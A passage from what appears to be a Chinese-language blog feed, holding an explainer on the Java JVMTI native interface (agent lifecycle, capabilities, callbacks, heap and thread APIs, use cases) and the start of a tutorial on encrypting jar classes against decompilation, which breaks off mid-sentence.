    <id>https://www.mi1k7ea.com/2020/05/03/浅谈JVMTI/</id>
    <published>2020-05-03T04:11:06.000Z</published>
    <updated>2020-05-03T07:59:05.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-JVMTI简介"><a href="#0x01-JVMTI简介" class="headerlink" title="0x01 JVMTI简介"></a>0x01 JVMTI简介</h2><p>JVMTI（JVM Tool Interface）是 Java 虚拟机所提供的 native 编程接口，是 JVMPI（Java Virtual Machine Profiler Interface）和 JVMDI（Java Virtual Machine Debug Interface）的更新版本。从这个 API 的发展历史轨迹中我们就可以知道，JVMTI 提供了可用于 debug 和 profiler 的接口；同时，在 Java 5/6 中，虚拟机接口也增加了监听（Monitoring），线程分析（Thread analysis）以及覆盖率分析（Coverage Analysis）等功能。正是由于 JVMTI 的强大功能，它是实现 Java 调试器，以及其它 Java 运行态测试与分析工具的基础。</p><p>JVMTI 并不一定在所有的 Java 虚拟机上都有实现，不同的虚拟机的实现也不尽相同。不过在一些主流的虚拟机中，比如 Sun 和 IBM，以及一些开源的如 Apache Harmony DRLVM 中，都提供了标准 JVMTI 实现。</p><p>JVMTI 是一套本地代码接口，因此使用 JVMTI 需要我们与 C/C++ 以及 JNI 打交道。事实上，开发时一般采用建立一个 Agent 的方式来使用 JVMTI，它使用 JVMTI 函数，设置一些回调函数，并从 Java 虚拟机中得到当前的运行态信息，并作出自己的判断，最后还可能操作虚拟机的运行态。把 Agent 编译成一个动态链接库之后，我们就可以在 Java 程序启动的时候来加载它（启动加载模式），也可以在 Java 5 之后使用运行时加载（活动加载模式）。</p><ul><li>-agentlib:agent-lib-name=options</li><li>-agentpath:path-to-agent=options</li></ul><p>注意：这里的 Agent 即 JVMTI 的客户端，它和执行 Java 程序的虚拟机运行在同一个进程上，因此通常他们的实现都很紧凑，他们通常由另一个独立的进程控制，充当这个独立进程和当前虚拟机之间的中介，通过调用 JVMTI 提供的接口和虚拟机交互，负责获取并返回当前虚拟机的状态或者转发控制命令。</p><h2 id="0x02-Agent的工作过程"><a href="#0x02-Agent的工作过程" class="headerlink" title="0x02 Agent的工作过程"></a>0x02 Agent的工作过程</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>Agent 是在 Java 虚拟机启动之时加载的，这个加载处于虚拟机初始化的早期，在这个时间点上：</p><ul><li>所有的 Java 类都未被初始化；</li><li>所有的对象实例都未被创建；</li><li>因而，没有任何 Java 代码被执行；</li></ul><p>但在这个时候，我们已经可以：</p><ul><li>操作 JVMTI 的 Capability 参数；</li><li>使用系统参数；</li></ul><p>动态库被加载之后，虚拟机会先寻找一个 Agent 入口函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">Agent_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">char</span> *options, <span class="keyword">void</span> *reserved)</span></span></span><br></pre></td></tr></table></figure><p>在这个函数中，虚拟机传入了一个 JavaVM 指针，以及命令行的参数。通过 JavaVM，我们可以获得 JVMTI 的指针，并获得 JVMTI 函数的使用能力，所有的 JVMTI 函数都通过这个 jvmtiEnv 获取，不同的虚拟机实现提供的函数细节可能不一样，但是使用的方式是统一的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jvmtiEnv *jvmti; </span><br><span class="line">(*jvm)-&gt;GetEnv(jvm, &amp;jvmti, JVMTI_VERSION_1_0);</span><br></pre></td></tr></table></figure><p>这里传入的版本信息参数很重要，不同的 JVMTI 环境所提供的功能以及处理方式都可能有所不同，不过它在同一个虚拟机中会保持不变（有心的读者可以去比较一下 JNI 环境）。命令行参数事实上就是上面启动命令行中的 options 部分，在 Agent 实现中需要进行解析并完成后续处理工作。参数传入的字符串仅仅在 Agent_OnLoad 函数里有效，如果需要长期使用，开发者需要做内存的复制工作，同时在最后还要释放这块存储。另外，有些 JDK 的实现会使用 JAVA_TOOL_OPTIONS 所提供的参数，这个常见于一些嵌入式的 Java 虚拟机（不使用命令行）。需要强调的是，这个时候由于虚拟机并未完成初始化工作，并不是所有的 JVMTI 函数都可以被使用。</p><p>Agent 还可以在运行时加载，如果您了解 Java Instrument 模块（可以参考<a href="http://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">这篇文章</a>），您一定对它的运行态加载有印象，这个新功能事实上也是 Java Agent 的一个实现。具体说来，虚拟机会在运行时监听并接受 Agent 的加载，在这个时候，它会使用 Agent 的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">Agent_OnAttach</span><span class="params">(JavaVM* vm, <span class="keyword">char</span> *options, <span class="keyword">void</span> *reserved)</span></span>;</span><br></pre></td></tr></table></figure><p>同样的在这个初始化阶段，不是所有的 JVMTI 的 Capability 参数都处于可操作状态，而且 options 这个 char 数组在这个函数运行之后就会被丢弃，如果需要，需要做好保留工作。</p><p>Agent 的主要功能是通过一系列的在虚拟机上设置的回调（callback）函数完成的，一旦某些事件发生，Agent 所设置的回调函数就会被调用，来完成特定的需求。</p><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>最后，Agent 完成任务，或者虚拟机关闭的时候，虚拟机都会调用一个类似于类析构函数的方法来完成最后的清理任务，注意这个函数和虚拟机自己的 VM_DEATH 事件是不同的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Agent_OnUnload</span><span class="params">(JavaVM *vm)</span></span></span><br></pre></td></tr></table></figure><h2 id="0x03-JVMTI的环境和错误处理"><a href="#0x03-JVMTI的环境和错误处理" class="headerlink" title="0x03 JVMTI的环境和错误处理"></a>0x03 JVMTI的环境和错误处理</h2><p>我们使用 JVMTI 的过程，主要是设置 JVMTI 环境，监听虚拟机所产生的事件，以及在某些事件上加上我们所希望的回调函数。</p><h3 id="JVMTI环境"><a href="#JVMTI环境" class="headerlink" title="JVMTI环境"></a>JVMTI环境</h3><p>我们可以通过操作 jvmtiCapabilities 来查询、增加、修改 JVMTI 的环境参数。当然，对于每一个不同的虚拟机来说，基于他们的实现不尽相同，导致了 JVMTI 的环境也不一定一致。标准的 jvmtiCapabilities 定义了一系列虚拟机的功能，比如 can_redefine_any_class 定义了虚拟机是否支持重定义类，can_retransform_classes 定义了是否支持在运行的时候改变类定义等等。如果熟悉 Java Instrumentation，一定不会对此感到陌生，因为 Instrumentation 就是对这些在 Java 层上的包装。对用户来说，这块最主要的是查看当前 JVMTI 环境，了解虚拟机具有的功能。要了解这个，其实很简单，只需通过对 jvmtiCapabilities 的一系列变量的考察就可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err = (*jvmti)-&gt;GetCapabilities(jvmti, &amp;capa); <span class="comment">// 取得 jvmtiCapabilities 指针。</span></span><br><span class="line"><span class="keyword">if</span> (err == JVMTI_ERROR_NONE) &#123;</span><br><span class="line">    <span class="keyword">if</span> (capa.can_redefine_any_class) &#123; ... &#125;</span><br><span class="line">&#125; <span class="comment">// 查看是否支持重定义类</span></span><br></pre></td></tr></table></figure><p>另外，虚拟机有自己的一些功能，一开始并未被启动，那么增加或修改 jvmtiCapabilities 也是可能的，但不同的虚拟机对这个功能的处理也不太一样，多数的虚拟机允许增改，但是有一定的限制，比如仅支持在 Agent_OnLoad 时，即虚拟机启动时作出，它某种程度上反映了虚拟机本身的构架。开发人员无需要考虑 Agent 的性能和内存占用，就可以在 Agent 被加载的时候启用所有功能：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">err = (*jvmti)-&gt;GetPotentialCapabilities(jvmti, &amp;capa); <span class="comment">// 取得所有可用的功能</span></span><br><span class="line"><span class="keyword">if</span> (err == JVMTI_ERROR_NONE) &#123;</span><br><span class="line">    err = (*jvmti)-&gt;AddCapabilities(jvmti, &amp;capa);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们要注意的是，JVMTI 的函数调用都有其时间性，即特定的函数只能在特定的虚拟机状态下才能调用，比如 SuspendThread（挂起线程）这个动作，仅在 Java 虚拟机处于运行状态（live phase）才能调用，否则导致一个内部异常。</p><h3 id="JVMTI错误处理"><a href="#JVMTI错误处理" class="headerlink" title="JVMTI错误处理"></a>JVMTI错误处理</h3><p>JVMTI 沿用了基本的错误处理方式，即使用返回的错误代码通知当前的错误，几乎所有的 JVMTI 函数调用都具有以下模式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvmtiError err = jvmti-&gt;someJVMTImethod (somePara … );</span><br></pre></td></tr></table></figure><p>其中 err 就是返回的错误代码，不同函数的错误信息可以在 Java 规范里查到。</p><h2 id="0x04-JVMTI基本功能"><a href="#0x04-JVMTI基本功能" class="headerlink" title="0x04 JVMTI基本功能"></a>0x04 JVMTI基本功能</h2><p>JVMTI 的功能非常丰富，包含了虚拟机中线程、内存 / 堆 / 栈，类 / 方法 / 变量，事件 / 定时器处理等等 20 多类功能，下面我们介绍一下，并举一些简单列子。</p><h3 id="事件处理和回调函数"><a href="#事件处理和回调函数" class="headerlink" title="事件处理和回调函数"></a>事件处理和回调函数</h3><p>从上文我们知道，使用 JVMTI 一个基本的方式就是设置回调函数，在某些事件发生的时候触发并作出相应的动作。因此这一部分的功能非常基本，当前版本的 JVMTI 提供了许多事件（Event）的回调，包括虚拟机初始化、开始运行、结束，类的加载，方法出入，线程始末等等。如果想对这些事件进行处理，我们需要首先为该事件写一个函数，然后在 jvmtiEventCallbacks 这个结构中指定相应的函数指针。比如，我们对线程启动感兴趣，并写了一个 HandleThreadStart 函数，那么我们需要在 Agent_OnLoad 函数里加入：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jvmtiEventCallbacks eventCallBacks;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ecbs, <span class="number">0</span>, <span class="keyword">sizeof</span>(ecbs)); <span class="comment">// 初始化</span></span><br><span class="line">eventCallBacks.ThreadStart = &amp;HandleThreadStart; <span class="comment">// 设置函数指针</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在设置了这些回调之后，就可以调用下述方法，来最终完成设置。在接下来的虚拟机运行过程中，一旦有线程开始运行发生，虚拟机就会回调 HandleThreadStart 方法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvmti-&gt;SetEventCallbacks(eventCallBacks, <span class="keyword">sizeof</span>(eventCallBacks));</span><br></pre></td></tr></table></figure><p>设置回调函数的时候，开发者需要注意以下几点：</p><ul><li>如同 Java 异常机制一样，如果在回调函数中自己抛出一个异常（Exception），或者在调用 JNI 函数的时候制造了一些麻烦，让 JNI 丢出了一个异常，那么任何在回调之前发生的异常就会丢失，这就要求开发人员要在处理错误的时候需要当心。</li><li>虚拟机不保证回调函数会被同步，换句话说，程序有可能同时运行同一个回调函数（比如，好几个线程同时开始运行了，这个 HandleThreadStart 就会被同时调用几次），那么开发人员在开发回调函数时需要处理同步的问题。</li></ul><h3 id="内存控制和对象获取"><a href="#内存控制和对象获取" class="headerlink" title="内存控制和对象获取"></a>内存控制和对象获取</h3><p>内存控制是一切运行态的基本功能。 JVMTI 除了提供最简单的内存申请和撤销之外（这块内存不受 Java 堆管理，开发人员需要自行进行清理工作，不然会造成内存泄漏），也提供了对 Java 堆的操作。众所周知，Java 堆中存储了 Java 的类、对象和基本类型（Primitive），通过对堆的操作，开发人员可以很容易的查找任意的类、对象，甚至可以强行执行垃圾收集工作。 JVMTI 中对 Java 堆的操作与众不同，它没有提供一个直接获取的方式（由此可见，虚拟机对对象的管理并非是哈希表，而是某种树 / 图方式），而是使用一个迭代器（iterater）的方式遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">FollowReferences</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jint heap_filter, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jclass klass, </span></span></span><br><span class="line"><span class="function"><span class="params">                            jobject initial_object,<span class="comment">// 该方式可以指定根节点</span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> jvmtiHeapCallbacks* callbacks,<span class="comment">// 设置回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> <span class="keyword">void</span>* user_data)</span></span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">IterateThroughHeap</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jint heap_filter, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jclass klass, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> jvmtiHeapCallbacks* callbacks, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> <span class="keyword">void</span>* user_data)</span><span class="comment">// 遍历整个 heap</span></span></span><br></pre></td></tr></table></figure><p>在遍历的过程中，开发者可以设定一定的条件，比如，指定是某一个类的对象，并设置一个回调函数，如果条件被满足，回调函数就会被执行。开发者可以在回调函数中对当前传回的指针进行打标记（tag）操作——这又是一个特殊之处，在第一遍遍历中，只能对满足条件的对象进行 tag ；然后再使用 GetObjectsWithTags 函数，获取需要的对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetObjectsWithTags</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jint tag_count, </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">const</span> jlong* tags, <span class="comment">// 设定特定的 tag，即我们上面所设置的</span></span></span></span><br><span class="line"><span class="function"><span class="params">                              jint* count_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jobject** object_result_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">                              jlong** tag_result_ptr)</span></span></span><br></pre></td></tr></table></figure><p>如果你仅仅想对特定 Java 对象操作，应该避免设置其他类型的回调函数，否则会影响效率，举例来说，多增加一个 primitive 的回调函数，可能会使整个操作效率下降一个数量级。</p><h3 id="线程和锁"><a href="#线程和锁" class="headerlink" title="线程和锁"></a>线程和锁</h3><p>线程是 Java 运行态中非常重要的一个部分，在 JVMTI 中也提供了很多 API 进行相应的操作，包括查询当前线程状态，暂停，恢复或者终端线程，还可以对线程锁进行操作。开发者可以获得特定线程所拥有的锁：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetOwnedMonitorInfo</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">    jthread thread, </span></span></span><br><span class="line"><span class="function"><span class="params">    jint* owned_monitor_count_ptr, </span></span></span><br><span class="line"><span class="function"><span class="params">    jobject** owned_monitors_ptr)</span></span></span><br></pre></td></tr></table></figure><p>也可以获得当前线程正在等待的锁：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jvmtiError <span class="title">GetCurrentContendedMonitor</span><span class="params">(jvmtiEnv* env, </span></span></span><br><span class="line"><span class="function"><span class="params">    jthread thread, </span></span></span><br><span class="line"><span class="function"><span class="params">    jobject* monitor_ptr)</span></span></span><br></pre></td></tr></table></figure><p>知道这些信息，事实上我们也可以设计自己的算法来判断是否死锁。更重要的是，JVMTI 提供了一系列的监视器（Monitor）操作，来帮助我们在 native 环境中实现同步。主要的操作是构建监视器（CreateRawMonitor），获取监视器（RawMonitorEnter），释放监视器（RawMonitorExit），等待和唤醒监视器 (RawMonitorWait,RawMonitorNotify) 等操作，通过这些简单锁，程序的同步操作可以得到保证。</p><h2 id="0x05-JVMTI数据结构"><a href="#0x05-JVMTI数据结构" class="headerlink" title="0x05 JVMTI数据结构"></a>0x05 JVMTI数据结构</h2><p>JVMTI 中使用的数据结构，首先也是一些标准的 JNI 数据结构，比如 jint，jlong ；其次，JVMTI 也定义了一些基本类型，比如 jthread，表示一个 thread，jvmtiEvent，表示 jvmti 所定义的事件；更复杂的有 JVMTI 的一些需要用结构体表示的数据结构，比如堆的信息（jvmtiStackInfo）。这些数据结构在文档中都有清楚的定义，本文就不再详细解释。</p><h2 id="0x06-JVMTI应用场景"><a href="#0x06-JVMTI应用场景" class="headerlink" title="0x06 JVMTI应用场景"></a>0x06 JVMTI应用场景</h2><h3 id="对class文件加密"><a href="#对class文件加密" class="headerlink" title="对class文件加密"></a>对class文件加密</h3><p>有时一些涉及到关键技术的class文件或者jar包我们不希望对外暴露，因而需要进行加密。使用一些常规的手段（例如使用混淆器或者自定义类加载器）来对class文件进行加密很容易被反编译。反编译后的代码虽然增加了阅读的难度，但花费一些功夫也是可以读懂的。</p><p>JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。</p><p>具体的实例可参考：<a href="/2020/05/01/Java代码反反编译思路/">《Java代码反反编译对抗思路》</a></p><h3 id="实现应用性能监控-APM"><a href="#实现应用性能监控-APM" class="headerlink" title="实现应用性能监控(APM)"></a>实现应用性能监控(APM)</h3><p>在微服务大行其道的环境下，分布式系统的逻辑结构变得越来越复杂。这给系统性能分析和问题定位带来了非常大的挑战。基于JVMTI的APM能够解决分布式架构和微服务带来的监控和运维上的挑战。APM通过汇聚业务系统各处理环节的实时数据，分析业务系统各事务处理的交易路径和处理时间，实现对应用的全链路性能监测。开源的Pinpoint, ZipKin, Hawkular,商业的AppDynamics，OneAPM，Google Dapper等都是个中好手。</p><h3 id="产品运行时错误监测及调试"><a href="#产品运行时错误监测及调试" class="headerlink" title="产品运行时错误监测及调试"></a>产品运行时错误监测及调试</h3><p>想要看生产环境的异常，最原始的方式是登录到生产环境的机器查看日志。稍微高级一点的方式是通过日志监控或者APM等工具将异常采集上来。但是这些手段都有许多明显的缺点。首先，不是所有的异常都会被打印到日志中，有些异常可能被代码吃掉了；其次，打印异常的时候通常只有异常堆栈信息，异常发生时上下文的变量值很难获取到（除非有经验的程序员将其打印出来了），而这些信息对定位异常的原因至关重要。基于JVMTI可以开发出一款工具来时事监控生产环境的异常。这方面有一款成熟的商业软件OverOps，其有三个主要的功能：1. 采集到所有的异常，包括try catch之后没有打印出来的异常；2. 可以采集到异常发生时上下文所有变量的值；3. 可以将异常发生的堆栈对应的源代码采集展示出来，从而在一个系统上就可以看代码定位问题，不需要打开ide调试源代码。</p><h3 id="Java程序的调试（debug）"><a href="#Java程序的调试（debug）" class="headerlink" title="Java程序的调试（debug）"></a>Java程序的调试（debug）</h3><p>一般JAVA的IDE都自带了调试工具。例如Eclipse的调试器相信大部分人都使用过。它的调试器org.eclipse.jdt.debug插件底层就是调用的JVMTI来实现的。不仅如此，随着服务云化的发展，google甚至推出了云端调试工具cloud debugger。它时一个web应用，可以直接对生产环境进行远程调试，不需要重启或者中断服务。阿里也有类似的工具Zdebugger。</p><h3 id="Java程序的诊断（profile）"><a href="#Java程序的诊断（profile）" class="headerlink" title="Java程序的诊断（profile）"></a>Java程序的诊断（profile）</h3><p>当出现cpu使用率过高、线程死锁等问题时，需要使用一些JAVA性能剖析或者诊断工具来分析具体的原因。例如Alibaba开源的Java诊断工具Arthas，深受开发者喜爱。Arthas的功能十分强大，它可以查看或者动态修改某个变量的值、统计某个方法调用链上的耗时、拦截方法前后，打印参数值和返回值，以及异常信息等。</p><h3 id="热加载"><a href="#热加载" class="headerlink" title="热加载"></a>热加载</h3><p>热加载指的是在不重启虚拟机的情况下重新加载一些class。热加载可以使本地调试代码非常节省时间，不用每次更新代码都重启一边程序。同时，在一线不方便重启的线上环境也能派上用场。这方面的代表产品有商业产品JRebel等。JRebel能够对应用中的任何class起作用。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda2/index.html" target="_blank" rel="noopener">JVMTI 和 Agent 实现</a></p><p><a href="https://blog.csdn.net/duqi_2009/article/details/94518203" target="_blank" rel="noopener">Java黑科技之源：JVMTI完全解读</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-JVMTI简介&quot;&gt;&lt;a href=&quot;#0x01-JVMTI简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 JVMTI简介&quot;&gt;&lt;/a&gt;0x01 JVMTI简介&lt;/h2&gt;&lt;p&gt;JVMTI（JVM Tool Interface）是 Jav
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java代码反反编译对抗思路</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Java%E4%BB%A3%E7%A0%81%E5%8F%8D%E5%8F%8D%E7%BC%96%E8%AF%91%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Java代码反反编译思路/</id>
    <published>2020-05-01T04:04:30.000Z</published>
    <updated>2020-05-03T03:56:49.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-几种反反编译的方法"><a href="#0x01-几种反反编译的方法" class="headerlink" title="0x01 几种反反编译的方法"></a>0x01 几种反反编译的方法</h2><p>Java代码是可以反编译的，但是很多时候一些Java开发者并不想让其他人知道自己的代码是怎么写的，就会对Java代码进行加密或混淆等操作，一般来说有三个思路：</p><ol><li>将class文件加密，这个是最安全的，但也费事儿，因为要重写classloader来解密class文件；</li><li>使用花指令，使得class文件不能反编译（利用反编译工具漏洞)；安全性一般，还是有花指令破解器；</li><li>代码混淆，提高代码阅读成本；简单易操作，一般采用这种或者与其它方式结合；</li></ol><p>当然，这几种方法都是可以被破解的，只是不同方法的破解成本不一样而已。</p><h2 id="0x02-准备jar包"><a href="#0x02-准备jar包" class="headerlink" title="0x02 准备jar包"></a>0x02 准备jar包</h2><p>新建一个ClassEncode项目，再新建两个类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String a = <span class="string">"This is Test Class .."</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">new</span> Test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is Test2 Class .."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着将该项目打包成jar包。</p><h3 id="IDEA打包jar"><a href="#IDEA打包jar" class="headerlink" title="IDEA打包jar"></a>IDEA打包jar</h3><p>在项目上鼠标右键 –&gt; Open Module Settings：</p><p><img src="/2020/05/01/Java代码反反编译思路/1.png" alt=""></p><p>Artifacts –&gt; + –&gt; JAR –&gt; From modules with dependencies：</p><p><img src="/2020/05/01/Java代码反反编译思路/2.png" alt=""></p><p>接着是设置Create JAR from Modules：</p><p><img src="/2020/05/01/Java代码反反编译思路/3.png" alt=""></p><p>Main Class是这个项目(脚本)的主方法，就是要运行的类，选Test类。</p><p>关于JAR files from libraries的两个选项:</p><ul><li><p>选中第一个的话，打完包后是一个Jar包；</p></li><li><p>选中第二个的话，打完包后是一个Jar包，外带你项目所用的Jar包；</p></li></ul><p>接下来是MF文件的存放目录。注意，<strong>不能使用默认目录，必须自定义目录，不然会运行错误，也不能使用src/main/resources这个目录</strong>。这里设置的是项目根目录下的src目录下来新建resource目录。</p><p>设置完之后，此时应该也必须有META-INF此文件，不然会运行错误。若JAR files from libraries选择src/main/resources目录，是没有META-INF文件的。Output directory是jar包的保存目录：</p><p><img src="/2020/05/01/Java代码反反编译思路/4.png" alt=""></p><p>点击Build：</p><p><img src="/2020/05/01/Java代码反反编译思路/5.png" alt=""></p><p>然后在out目录中看到生成了Jar包：</p><p><img src="/2020/05/01/Java代码反反编译思路/6.png" alt=""></p><p>这时的运行jar包就能执行了：</p><p><img src="/2020/05/01/Java代码反反编译思路/7.png" alt=""></p><p>ok，我们就拿这个包作为Demo进行反编译操作。</p><h3 id="手动打包jar"><a href="#手动打包jar" class="headerlink" title="手动打包jar"></a>手动打包jar</h3><p>当然，也可以手动打包jar文件。</p><p>目录结构如下：</p><ul><li><p>com</p><ul><li><p>mi1k7ea</p><p>​    Test.class</p><p>​    Test2.class</p></li></ul></li><li><p>META-INF</p><p>​    MANIFEST.MF</p></li></ul><p>其中MANIFEST.MF中的Main-Class要指定主要的执行类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.mi1k7ea.Test</span><br></pre></td></tr></table></figure><p>注意：最后必须要回车空行出来。</p><p>最后在当前目录运行一下命令打包成jar并执行即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm test.jar META-INF\MANIFEST.MF .</span><br><span class="line">java -jar test.jar</span><br></pre></td></tr></table></figure><h2 id="0x03-加密Jar包和class文件"><a href="#0x03-加密Jar包和class文件" class="headerlink" title="0x03 加密Jar包和class文件"></a>0x03 加密Jar包和class文件</h2><h3 id="利用JVMTI实现反反编译"><a href="#利用JVMTI实现反反编译" class="headerlink" title="利用JVMTI实现反反编译"></a>利用JVMTI实现反反编译</h3><p>JVMTI（JVM Tool Interface）是Java虚拟机所提供的native编程接口，可以探查JVM内部状态，并控制JVM应用程序的执行。可实现的功能包括但不限于：调试、监控、线程分析、覆盖率分析工具等。</p><p>JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。</p><p>这里用到一个工具：<a href="https://github.com/AloneMonkey/JarEncrypt" target="_blank" rel="noopener">https://github.com/AloneMonkey/JarEncrypt</a></p><p>解压之后得到如下的目录结构及文件：</p><ul><li>JarEncrypt/encrypt：加密库<ul><li>encrypt.cpp</li><li>Makefile</li><li>Encrypt.java（Java加密执行文件）</li></ul></li><li>JarEncrypt/decrypt：解密库<ul><li>decrypt.cpp</li><li>Makefile</li></ul></li></ul><p>打开Encrypt.java文件，修改需要进行加密的类为以”com.mi1k7ea”开头的包下的所有类：</p><p><img src="/2020/05/01/Java代码反反编译思路/8.png" alt=""></p><p>然后打开decrypt子目录下的decrypt.cpp文件，修改需要进行解密的类为以”com.mi1k7ea”开头的包下的所有类：</p><p><img src="/2020/05/01/Java代码反反编译思路/9.png" alt=""></p><p>接着，进入encrypt目录，执行make，编译生成libencrypt.so：</p><p><img src="/2020/05/01/Java代码反反编译思路/10.png" alt=""></p><p>注意，在Linux可能会报找不到jni.h和jni_md.h文件的错误，这里需要通过<code>locate jni.h</code>和<code>locate 